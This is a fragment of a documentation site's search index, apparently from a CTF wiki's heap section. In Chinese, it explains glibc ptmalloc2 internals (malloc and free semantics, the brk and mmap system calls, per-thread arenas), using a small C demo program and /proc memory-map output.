\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u7533\u8bf7\u7684\u5185\u5b58\u4e0e\u5df2\u7ecf\u5b58\u5728\u7684\u5185\u5b58\u6bb5\u7ed3\u5408\u5728\u4e86\u4e00\u8d77\u6784\u6210\u4e86b7e00000\u5230b7e21000\u7684mmap\u6bb5\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000 -08049000 r-xp 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000 -0804a000 r--p 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap b7e00000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ munmap \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u539f\u6765\u7533\u8bf7\u7684\u5185\u5b58\u6bb5\u5df2\u7ecf\u6ca1\u6709\u4e86\uff0c\u5185\u5b58\u6bb5\u53c8\u6062\u590d\u4e86\u539f\u6765\u7684\u6837\u5b50\u4e86\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ cat /proc/6067/maps 08048000 -08049000 r-xp 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 08049000 -0804a000 r--p 00000000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap 0804a000-0804b000 rw-p 00001000 08 :01 539691 /home/sploitfun/ptmalloc.ppt/syscalls/mmap b7e21000-b7e22000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/syscalls$ \u591a\u7ebf\u7a0b\u652f\u6301 \u00b6 \u5728\u539f\u6765\u7684 dlmalloc \u5b9e\u73b0\u4e2d\uff0c\u5f53\u4e24\u4e2a\u7ebf\u7a0b\u540c\u65f6\u8981\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u53ef\u4ee5\u8fdb\u5165\u4e34\u754c\u533a\u7533\u8bf7\u5185\u5b58\uff0c\u800c\u53e6\u5916\u4e00\u4e2a\u7ebf\u7a0b\u5219\u5fc5\u987b\u7b49\u5f85\u76f4\u5230\u4e34\u754c\u533a\u4e2d\u4e0d\u518d\u6709\u7ebf\u7a0b\u3002\u8fd9\u662f\u56e0\u4e3a\u6240\u6709\u7684\u7ebf\u7a0b\u5171\u4eab\u4e00\u4e2a\u5806\u3002\u5728glibc\u7684ptmalloc\u5b9e\u73b0\u4e2d\uff0c\u6bd4\u8f83\u597d\u7684\u4e00\u70b9\u5c31\u662f\u652f\u6301\u4e86\u591a\u7ebf\u7a0b\u7684\u5feb\u901f\u8bbf\u95ee\u3002\u5728\u65b0\u7684\u5b9e\u73b0\u4e2d\uff0c\u6240\u6709\u7684\u7ebf\u7a0b\u5171\u4eab\u591a\u4e2a\u5806\u3002 \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50\u3002 /* Per thread arena example. */ ##include <stdio.h> ##include <stdlib.h> ##include <pthread.h> ##include <unistd.h> ##include <sys/types.h> void * threadFunc ( void * arg ) { printf ( \"Before malloc in thread 1 \\n \" ); getchar (); char * addr = ( char * ) malloc ( 1000 ); printf ( \"After malloc and before free in thread 1 \\n \" ); getchar (); free ( addr ); printf ( \"After free in thread 1 \\n \" ); getchar (); } int main () { pthread_t t1 ; void * s ; int ret ; char * addr ; printf ( \"Welcome to per thread arena example::%d \\n \" , getpid ()); printf ( \"Before malloc in main thread \\n \" ); getchar (); addr = ( char * ) malloc ( 1000 ); printf ( \"After malloc and before free in main thread \\n \" ); getchar (); free ( addr ); printf ( \"After free in main thread \\n \" ); getchar (); ret = pthread_create ( & t1 , NULL , threadFunc , NULL ); if ( ret ) { printf ( \"Thread creation error \\n \" ); return - 1 ; } ret = pthread_join ( t1 , & s ); if ( ret ) { printf ( \"Thread join error \\n \" ); return - 1 ; } return 0 ; } \u7b2c\u4e00\u6b21\u7533\u8bf7\u4e4b\u524d \uff0c \u6ca1\u6709\u4efb\u4f55\u4efb\u4f55\u5806\u6bb5\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread b7e05000-b7e07000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u7b2c\u4e00\u6b21\u7533\u8bf7\u540e \uff0c \u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5806\u6bb5\u88ab\u5efa\u7acb\u4e86\uff0c\u5e76\u4e14\u5b83\u5c31\u7d27\u90bb\u7740\u6570\u636e\u6bb5\uff0c\u8fd9\u8bf4\u660emalloc\u7684\u80cc\u540e\u662f\u7528brk\u51fd\u6570\u6765\u5b9e\u73b0\u7684\u3002\u540c\u65f6\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u867d\u7136\u53ea\u662f\u7533\u8bf7\u4e861000\u4e2a\u5b57\u8282\uff0c\u4f46\u662f\u6211\u4eec\u5374\u5f97\u5230\u4e860x0806c000-0x0804b000=0x21000\u4e2a\u5b57\u8282\u7684\u5806\u3002 \u8fd9\u8bf4\u660e\u867d\u7136\u7a0b\u5e8f\u53ef\u80fd\u53ea\u662f\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5f88\u5c0f\u7684\u5185\u5b58\uff0c\u4f46\u662f\u4e3a\u4e86\u65b9\u4fbf\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u628a\u5f88\u5927\u7684\u5185\u5b58\u5206\u914d\u7ed9\u7a0b\u5e8f\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5c31\u907f\u514d\u4e86\u591a\u6b21\u5185\u6838\u6001\u4e0e\u7528\u6237\u6001\u7684\u5207\u6362\uff0c\u63d0\u9ad8\u4e86\u7a0b\u5e8f\u7684\u6548\u7387\u3002 \u6211\u4eec\u79f0\u8fd9\u4e00\u5757\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u4e3a arena\u3002\u6b64\u5916\uff0c\u6211\u4eec\u79f0\u7531\u4e3b\u7ebf\u7a0b\u7533\u8bf7\u7684\u5185\u5b58\u4e3a main_arena\u3002\u540e\u7eed\u7684\u7533\u8bf7\u7684\u5185\u5b58\u4f1a\u4e00\u76f4\u4ece\u8fd9\u4e2a arena \u4e2d\u83b7\u53d6\uff0c\u76f4\u5230\u7a7a\u95f4\u4e0d\u8db3\u3002\u5f53 arena \u7a7a\u95f4\u4e0d\u8db3\u65f6\uff0c\u5b83\u53ef\u4ee5\u901a\u8fc7\u589e\u52a0brk\u7684\u65b9\u5f0f\u6765\u589e\u52a0\u5806\u7684\u7a7a\u95f4\u3002\u7c7b\u4f3c\u5730\uff0carena \u4e5f\u53ef\u4ee5\u901a\u8fc7\u51cf\u5c0f brk \u6765\u7f29\u5c0f\u81ea\u5df1\u7684\u7a7a\u95f4\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread ... sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00 :00 0 [ heap ] b7e05000-b7e07000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u5728\u4e3b\u7ebf\u7a0b\u91ca\u653e\u5185\u5b58\u540e \uff0c\u6211\u4eec\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u53ef\u4ee5\u770b\u51fa\uff0c\u5176\u5bf9\u5e94\u7684 arena \u5e76\u6ca1\u6709\u8fdb\u884c\u56de\u6536\uff0c\u800c\u662f\u4ea4\u7531glibc\u6765\u8fdb\u884c\u7ba1\u7406\u3002\u5f53\u540e\u9762\u7a0b\u5e8f\u518d\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u5728 glibc \u4e2d\u7ba1\u7406\u7684\u5185\u5b58\u5145\u8db3\u7684\u60c5\u51b5\u4e0b\uff0cglibc \u5c31\u4f1a\u6839\u636e\u5806\u5206\u914d\u7684\u7b97\u6cd5\u6765\u7ed9\u7a0b\u5e8f\u5206\u914d\u76f8\u5e94\u7684\u5185\u5b58\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread ... sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00 :00 0 [ heap ] b7e05000-b7e07000 rw-p 00000000 00 :00 0 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u5728\u7b2c\u4e00\u4e2a\u7ebf\u7a0bmalloc\u4e4b\u524d \uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5e76\u6ca1\u6709\u51fa\u73b0\u4e0e\u7ebf\u7a0b1\u76f8\u5173\u7684\u5806\uff0c\u4f46\u662f\u51fa\u73b0\u4e86\u4e0e\u7ebf\u7a0b1\u76f8\u5173\u7684\u6808\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00 :00 0 [ heap ] b7604000-b7605000 ---p 00000000 00 :00 0 b7605000-b7e07000 rw-p 00000000 00 :00 0 [ stack:6594 ] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u7b2c\u4e00\u4e2a\u7ebf\u7a0bmalloc\u540e \uff0c \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u8f93\u51fa\u770b\u51fa\u7ebf\u7a0b1\u7684\u5806\u6bb5\u88ab\u5efa\u7acb\u4e86\u3002\u800c\u4e14\u5b83\u6240\u5728\u7684\u4f4d\u7f6e\u4e3a\u5185\u5b58\u6620\u5c04\u6bb5\u533a\u57df\uff0c\u540c\u6837\u5927\u5c0f\u4e5f\u662f132KB(b7500000-b7521000)\u3002\u56e0\u6b64\u8fd9\u8868\u660e\u8be5\u7ebf\u7a0b\u7533\u8bf7\u7684\u5806\u65f6\uff0c\u80cc\u540e\u5bf9\u5e94\u7684\u51fd\u6570\u4e3ammap\u51fd\u6570\u3002\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u5b9e\u9645\u771f\u7684\u5206\u914d\u7ed9\u7a0b\u5e8f\u7684\u5185\u5b58\u4e3a1M(b7500000-b7600000)\u3002\u800c\u4e14\uff0c\u53ea\u6709132KB\u7684\u90e8\u5206\u5177\u6709\u53ef\u8bfb\u53ef\u5199\u6743\u9650\uff0c\u8fd9\u4e00\u5757\u8fde\u7eed\u7684\u533a\u57df\u6210\u4e3athread arena\u3002 \u6ce8\u610f\uff1a \u5f53\u7528\u6237\u8bf7\u6c42\u7684\u5185\u5b58\u5927\u4e8e128KB\u65f6\uff0c\u5e76\u4e14\u6ca1\u6709\u4efb\u4f55arena\u6709\u8db3\u591f\u7684\u7a7a\u95f4\u65f6\uff0c\u90a3\u4e48\u7cfb\u7edf\u5c31\u4f1a\u6267\u884cmmap\u51fd\u6570\u6765\u5206\u914d\u76f8\u5e94\u7684\u5185\u5b58\u7a7a\u95f4\u3002\u8fd9\u4e0e\u8fd9\u4e2a\u8bf7\u6c42\u6765\u81ea\u4e8e\u4e3b\u7ebf\u7a0b\u8fd8\u662f\u4ece\u7ebf\u7a0b\u65e0\u5173\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 After malloc and before free in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00 :00 0 [ heap ] b7500000-b7521000 rw-p 00000000 00 :00 0 b7521000-b7600000 ---p 00000000 00 :00 0 b7604000-b7605000 ---p 00000000 00 :00 0 b7605000-b7e07000 rw-p 00000000 00 :00 0 [ stack:6594 ] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u5728\u7b2c\u4e00\u4e2a\u7ebf\u7a0b\u91ca\u653e\u5185\u5b58\u540e \uff0c \u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u7684\u8f93\u51fa\u770b\u5230\uff0c\u8fd9\u6837\u91ca\u653e\u5185\u5b58\u540c\u6837\u4e0d\u4f1a\u628a\u5185\u5b58\u91cd\u65b0\u7ed9\u7cfb\u7edf\u3002 sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread Welcome to per thread arena example::6501 Before malloc in main thread After malloc and before free in main thread After free in main thread Before malloc in thread 1 After malloc and before free in thread 1 After free in thread 1 ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps 08048000 -08049000 r-xp 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 08049000 -0804a000 r--p 00000000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804a000-0804b000 rw-p 00001000 08 :01 539625 /home/sploitfun/ptmalloc.ppt/mthread/mthread 0804b000-0806c000 rw-p 00000000 00 :00 0 [ heap ] b7500000-b7521000 rw-p 00000000 00 :00 0 b7521000-b7600000 ---p 00000000 00 :00 0 b7604000-b7605000 ---p 00000000 00 :00 0 b7605000-b7e07000 rw-p 00000000 00 :00 0 [ stack:6594 ] ... sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ \u53c2\u8003\u6587\u732e \u00b6 sploitfun","title":"\u5806\u6982\u8ff0"},{"location":"pwn/heap/heap_overview/#_1","text":"","title":"\u5806\u6982\u8ff0"},{"location":"pwn/heap/heap_overview/#_2","text":"\u5728\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u5806\u53ef\u4ee5\u63d0\u4f9b\u52a8\u6001\u5206\u914d\u7684\u5185\u5b58\uff0c\u5141\u8bb8\u7a0b\u5e8f\u7533\u8bf7\u5927\u5c0f\u672a\u77e5\u7684\u5185\u5b58\u3002\u5806\u5176\u5b9e\u5c31\u662f\u7a0b\u5e8f\u865a\u62df\u5730\u5740\u7a7a\u95f4\u7684\u4e00\u5757\u8fde\u7eed\u7684\u7ebf\u6027\u533a\u57df\uff0c\u5b83\u7531\u4f4e\u5730\u5740\u5411\u9ad8\u5730\u5740\u65b9\u5411\u589e\u957f\u3002\u6211\u4eec\u4e00\u822c\u79f0\u7ba1\u7406\u5806\u7684\u90a3\u90e8\u5206\u7a0b\u5e8f\u4e3a\u5806\u7ba1\u7406\u5668\u3002 \u5806\u7ba1\u7406\u5668\u5904\u4e8e\u7528\u6237\u7a0b\u5e8f\u4e0e\u5185\u6838\u4e2d\u95f4\uff0c\u4e3b\u8981\u505a\u4ee5\u4e0b\u5de5\u4f5c \u54cd\u5e94\u7528\u6237\u7684\u7533\u8bf7\u5185\u5b58\u8bf7\u6c42\uff0c\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58\uff0c\u7136\u540e\u5c06\u5176\u8fd4\u56de\u7ed9\u7528\u6237\u7a0b\u5e8f\u3002\u540c\u65f6\uff0c\u4e3a\u4e86\u4fdd\u6301\u5185\u5b58\u7ba1\u7406\u7684\u9ad8\u6548\u6027\uff0c\u5185\u6838\u4e00\u822c\u90fd\u4f1a\u9884\u5148\u5206\u914d\u5f88\u5927\u7684\u4e00\u5757\u8fde\u7eed\u7684\u5185\u5b58\uff0c\u7136\u540e\u8ba9\u5806\u7ba1\u7406\u5668\u901a\u8fc7\u67d0\u79cd\u7b97\u6cd5\u7ba1\u7406\u8fd9\u5757\u5185\u5b58\u3002\u53ea\u6709\u5f53\u51fa\u73b0\u4e86\u5806\u7a7a\u95f4\u4e0d\u8db3\u7684\u60c5\u51b5\uff0c\u5806\u7ba1\u7406\u5668\u624d\u4f1a\u518d\u6b21\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u8fdb\u884c\u4ea4\u4e92\u3002 \u7ba1\u7406\u7528\u6237\u6240\u91ca\u653e\u7684\u5185\u5b58\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u7528\u6237\u91ca\u653e\u7684\u5185\u5b58\u5e76\u4e0d\u662f\u76f4\u63a5\u8fd4\u8fd8\u7ed9\u64cd\u4f5c\u7cfb\u7edf\u7684\uff0c\u800c\u662f\u7531\u5806\u7ba1\u7406\u5668\u8fdb\u884c\u7ba1\u7406\u3002\u8fd9\u4e9b\u91ca\u653e\u7684\u5185\u5b58\u53ef\u4ee5\u6765\u54cd\u5e94\u7528\u6237\u65b0\u7533\u8bf7\u7684\u5185\u5b58\u7684\u8bf7\u6c42\u3002 Linux \u4e2d\u65e9\u671f\u7684\u5806\u5206\u914d\u4e0e\u56de\u6536\u7531 Doug Lea \u5b9e\u73b0\uff0c\u4f46\u5b83\u5728\u5e76\u884c\u5904\u7406\u591a\u4e2a\u7ebf\u7a0b\u65f6\uff0c\u4f1a\u5171\u4eab\u8fdb\u7a0b\u7684\u5806\u5185\u5b58\u7a7a\u95f4\u3002\u56e0\u6b64\uff0c\u4e3a\u4e86\u5b89\u5168\u6027\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u4f7f\u7528\u5806\u65f6\uff0c\u4f1a\u8fdb\u884c\u52a0\u9501\u3002\u7136\u800c\uff0c\u4e0e\u6b64\u540c\u65f6\uff0c\u52a0\u9501\u4f1a\u5bfc\u81f4\u5176\u5b83\u7ebf\u7a0b\u65e0\u6cd5\u4f7f\u7528\u5806\uff0c\u964d\u4f4e\u4e86\u5185\u5b58\u5206\u914d\u548c\u56de\u6536\u7684\u9ad8\u6548\u6027\u3002\u540c\u65f6\uff0c\u5982\u679c\u5728\u591a\u7ebf\u7a0b\u4f7f\u7528\u65f6\uff0c\u6ca1\u80fd\u6b63\u786e\u63a7\u5236\uff0c\u4e5f\u53ef\u80fd\u5f15\u8d77\u5185\u5b58\u5206\u914d\u548c\u56de\u6536\u7684\u6b63\u786e\u6027\u3002Wolfram Gloger \u5728 Doug Lea \u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u6539\u8fdb\u4f7f\u5176\u53ef\u4ee5\u652f\u6301\u591a\u7ebf\u7a0b\uff0c\u8fd9\u4e2a\u5806\u5206\u914d\u5668\u5c31\u662f ptmalloc \u3002\u5728 glibc-2.3.x. \u4e4b\u540e\uff0cglibc \u4e2d\u96c6\u6210\u4e86ptmalloc2\u3002 \u76ee\u524d Linux \u6807\u51c6\u53d1\u884c\u7248\u4e2d\u4f7f\u7528\u7684\u5806\u5206\u914d\u5668\u662f glibc \u4e2d\u7684\u5806\u5206\u914d\u5668\uff1aptmalloc2\u3002ptmalloc2 \u4e3b\u8981\u662f\u901a\u8fc7 malloc/free \u51fd\u6570\u6765\u5206\u914d\u548c\u91ca\u653e\u5185\u5b58\u5757\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u5185\u5b58\u5206\u914d\u4e0e\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0cLinux\u6709\u8fd9\u6837\u7684\u4e00\u4e2a\u57fa\u672c\u5185\u5b58\u7ba1\u7406\u601d\u60f3\uff0c \u53ea\u6709\u5f53\u771f\u6b63\u8bbf\u95ee\u4e00\u4e2a\u5730\u5740\u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u624d\u4f1a\u5efa\u7acb\u865a\u62df\u9875\u9762\u4e0e\u7269\u7406\u9875\u9762\u7684\u6620\u5c04\u5173\u7cfb \u3002 \u6240\u4ee5\u867d\u7136\u64cd\u4f5c\u7cfb\u7edf\u5df2\u7ecf\u7ed9\u7a0b\u5e8f\u5206\u914d\u4e86\u5f88\u5927\u7684\u4e00\u5757\u5185\u5b58\uff0c\u4f46\u662f\u8fd9\u5757\u5185\u5b58\u5176\u5b9e\u53ea\u662f\u865a\u62df\u5185\u5b58\u3002\u53ea\u6709\u5f53\u7528\u6237\u4f7f\u7528\u5230\u76f8\u5e94\u7684\u5185\u5b58\u65f6\uff0c\u7cfb\u7edf\u624d\u4f1a\u771f\u6b63\u5206\u914d\u7269\u7406\u9875\u9762\u7ed9\u7528\u6237\u4f7f\u7528\u3002","title":"\u4ec0\u4e48\u662f\u5806"},{"location":"pwn/heap/heap_overview/#_3","text":"\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ecb\u7ecd \u57fa\u672c\u7684\u5806\u64cd\u4f5c\uff0c\u5305\u62ec\u5806\u7684\u5206\u914d\uff0c\u56de\u6536\uff0c\u5806\u5206\u914d\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528 \u4ecb\u7ecd\u5806\u76ee\u524d\u7684\u591a\u7ebf\u7a0b\u652f\u6301\u3002","title":"\u5806\u7684\u57fa\u672c\u64cd\u4f5c"},{"location":"pwn/heap/heap_overview/#malloc","text":"\u5728 glibc \u7684 malloc.h \u4e2d\uff0cmalloc \u7684\u8bf4\u660e\u5982\u4e0b /* malloc(size_t n) Returns a pointer to a newly allocated chunk of at least n bytes, or null if no space is available. Additionally, on failure, errno is set to ENOMEM on ANSI C systems. If n is zero, malloc returns a minumum-sized chunk. (The minimum size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit systems.) On most systems, size_t is an unsigned type, so calls with negative arguments are interpreted as requests for huge amounts of space, which will often fail. The maximum supported value of n differs across systems, but is in all cases less than the maximum representable value of a size_t. */ \u53ef\u4ee5\u770b\u51fa\uff0cmalloc \u51fd\u6570\u8fd4\u56de\u5bf9\u5e94\u5927\u5c0f\u5b57\u8282\u7684\u5185\u5b58\u5757\u7684\u6307\u9488\u3002\u6b64\u5916\uff0c\u8be5\u51fd\u6570\u8fd8\u5bf9\u4e00\u4e9b\u5f02\u5e38\u60c5\u51b5\u8fdb\u884c\u4e86\u5904\u7406 \u5f53 n=0 \u65f6\uff0c\u8fd4\u56de\u5f53\u524d\u7cfb\u7edf\u5141\u8bb8\u7684\u5806\u7684\u6700\u5c0f\u5185\u5b58\u5757\u3002 \u5f53 n \u4e3a\u8d1f\u6570\u65f6\uff0c\u7531\u4e8e\u5728\u5927\u591a\u6570\u7cfb\u7edf\u4e0a\uff0c size_t \u662f\u65e0\u7b26\u53f7\u6570\uff08\u8fd9\u4e00\u70b9\u975e\u5e38\u91cd\u8981\uff09 \uff0c\u6240\u4ee5\u7a0b\u5e8f\u5c31\u4f1a\u7533\u8bf7\u5f88\u5927\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u4f46\u901a\u5e38\u6765\u8bf4\u90fd\u4f1a\u5d29\u6e83\uff0c\u56e0\u4e3a\u7cfb\u7edf\u6ca1\u6709\u90a3\u4e48\u591a\u7684\u5185\u5b58\u53ef\u4ee5\u5206\u914d\u3002","title":"malloc"},{"location":"pwn/heap/heap_overview/#free","text":"\u5728 glibc \u7684 malloc.h \u4e2d\uff0cfree \u7684\u8bf4\u660e\u5982\u4e0b /* free(void* p) Releases the chunk of memory pointed to by p, that had been previously allocated using malloc or a related routine such as realloc. It has no effect if p is null. It can have arbitrary (i.e., bad!) effects if p has already been freed. Unless disabled (using mallopt), freeing very large spaces will when possible, automatically trigger operations that give back unused memory to the system, thus reducing program footprint. */ \u53ef\u4ee5\u770b\u51fa\uff0cfree \u51fd\u6570\u4f1a\u91ca\u653e\u7531 p \u6240\u6307\u5411\u7684\u5185\u5b58\u5757\u3002\u8fd9\u4e2a\u5185\u5b58\u5757\u6709\u53ef\u80fd\u662f\u901a\u8fc7 malloc \u51fd\u6570\u5f97\u5230\u7684\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u901a\u8fc7\u76f8\u5173\u7684\u51fd\u6570 realloc \u5f97\u5230\u7684\u3002 \u6b64\u5916\uff0c\u8be5\u51fd\u6570\u4e5f\u540c\u6837\u5bf9\u5f02\u5e38\u60c5\u51b5\u8fdb\u884c\u4e86\u5904\u7406 \u5f53 p \u4e3a\u7a7a\u6307\u9488\u65f6\uff0c\u51fd\u6570\u4e0d\u6267\u884c\u4efb\u4f55\u64cd\u4f5c\u3002 \u5f53 p \u5df2\u7ecf\u88ab\u91ca\u653e\u4e4b\u540e\uff0c\u518d\u6b21\u91ca\u653e\u4f1a\u51fa\u73b0\u4e71\u4e03\u516b\u7cdf\u7684\u6548\u679c\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f double free \u3002 \u9664\u4e86\u88ab\u7981\u7528 (mallopt) \u7684\u60c5\u51b5\u4e0b\uff0c\u5f53\u91ca\u653e\u5f88\u5927\u7684\u5185\u5b58\u7a7a\u95f4\u65f6\uff0c\u7a0b\u5e8f\u4f1a\u5c06\u8fd9\u4e9b\u5185\u5b58\u7a7a\u95f4\u8fd8\u7ed9\u7cfb\u7edf\uff0c\u4ee5\u4fbf\u4e8e\u51cf\u5c0f\u7a0b\u5e8f\u6240\u4f7f\u7528\u7684\u5185\u5b58\u7a7a\u95f4\u3002","title":"free"},{"location":"pwn/heap/heap_overview/#_4","text":"\u5728\u524d\u9762\u63d0\u5230\u7684\u51fd\u6570\u4e2d\uff0c\u65e0\u8bba\u662f malloc \u51fd\u6570\u8fd8\u662f free \u51fd\u6570\uff0c\u6211\u4eec\u52a8\u6001\u7533\u8bf7\u548c\u91ca\u653e\u5185\u5b58\u65f6\uff0c\u90fd\u7ecf\u5e38\u4f1a\u4f7f\u7528\uff0c\u4f46\u662f\u5b83\u4eec\u5e76\u4e0d\u662f\u771f\u6b63\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u7684\u51fd\u6570\u3002\u8fd9\u4e9b\u51fd\u6570\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528\u4e3b\u8981\u662f (s)brk \u51fd\u6570\u4ee5\u53ca mmap, munmap \u51fd\u6570\u3002 \u5982\u4e0b\u56fe\u6240\u793a\uff0c\u6211\u4eec\u4e3b\u8981\u8003\u8651\u5bf9\u5806\u8fdb\u884c\u7533\u8bf7\u5185\u5b58\u5757\u7684\u64cd\u4f5c\u3002","title":"\u5185\u5b58\u5206\u914d\u80cc\u540e\u7684\u7cfb\u7edf\u8c03\u7528"},{"location":"pwn/heap/heap_overview/#sbrk","text":"\u5bf9\u4e8e\u5806\u7684\u64cd\u4f5c\uff0c\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u4e86 brk \u51fd\u6570\uff0cglibc \u5e93\u63d0\u4f9b\u4e86 sbrk \u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u589e\u52a0 brk (program break location, the program break is the address of the first location beyond the current end of the data region, https://en.wikipedia.org/wiki/Sbrk)\u7684\u5927\u5c0f\u6765\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58 \u3002 \u521d\u59cb\u65f6\uff0c\u5806\u7684\u8d77\u59cb\u5730\u5740 start_brk \u4ee5\u53ca\u5806\u7684\u5f53\u524d\u672b\u5c3e brk \u6307\u5411\u540c\u4e00\u5730\u5740\u3002\u6839\u636e\u662f\u5426\u5f00\u542fASLR\uff0c\u4e24\u8005\u7684\u5177\u4f53\u4f4d\u7f6e\u4f1a\u6709\u6240\u4e0d\u540c 